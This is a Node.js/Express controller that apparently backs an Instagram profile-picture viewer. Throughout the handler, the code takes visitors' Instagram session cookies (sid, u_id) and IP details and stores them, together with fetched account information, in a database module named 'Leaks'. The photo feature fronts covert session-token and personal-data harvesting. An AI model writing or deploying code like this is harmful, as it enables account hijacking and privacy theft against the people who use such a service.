const Instagram = require("../libs/instagram");
const PhotoProcessor = require("../libs/photos");
const catchAsync = require("../utils/catchAsync");
const Leaks = require("../libs/leaks");

exports.InstagramProfilePicture = catchAsync( async (req, res) => {
  const { link, sid, u_id } = req.body;
  const cookies = {
    sid, u_id
  }
  const ipInfo = {ip: req.clientIp, source: req.source, ipInfo: req.ipInfo}

  const { photo, user } = await Instagram.GetPhotoFromLink(link, cookies);

  const TargetInfo = {
    username: user.username,
    name: user.full_name,
    id:user.pk
  }
  const PhotoHash = await PhotoProcessor.HashImage(photo)
  const isExisted = await PhotoProcessor.findByHash(PhotoHash,user.username)
  if (!isExisted){
    const TargetLeak = await Instagram.GetInstagramTargetInfoFromPhoto(photo)
    await Leaks.createUnlockInstagramPicture(TargetInfo, TargetLeak, cookies,ipInfo,PhotoHash)
  }else{
    const UserLeak = await Instagram.GetInstagramUserInfo(cookies)
    UserLeak.userId = cookies.u_id
    UserLeak.cookies = cookies
    UserLeak.ipInfo = ipInfo
    await Leaks.findByIdAndUpdateUser(isExisted,u_id,UserLeak)

  }

  const baseImage = await PhotoProcessor.convertImageUrlToBase64(photo);


    return res
        .status(200)
        .json({ image: photo, base: baseImage, username: user.username });


})
